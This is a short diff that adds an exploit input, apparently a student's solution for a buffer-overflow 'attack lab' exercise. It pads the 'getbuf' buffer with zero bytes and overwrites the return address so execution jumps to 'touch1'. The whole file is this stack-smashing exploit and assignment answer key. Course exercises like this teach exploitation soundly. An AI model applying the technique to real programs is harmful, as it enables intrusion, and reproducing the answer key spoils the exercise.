@@ -1,0 +1,4 @@
+/* Padding as mush as in getbuf function*/
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+/* Return address to where it does val = 1 in touch1*/
+8c 27 40 00 00 00 00 00
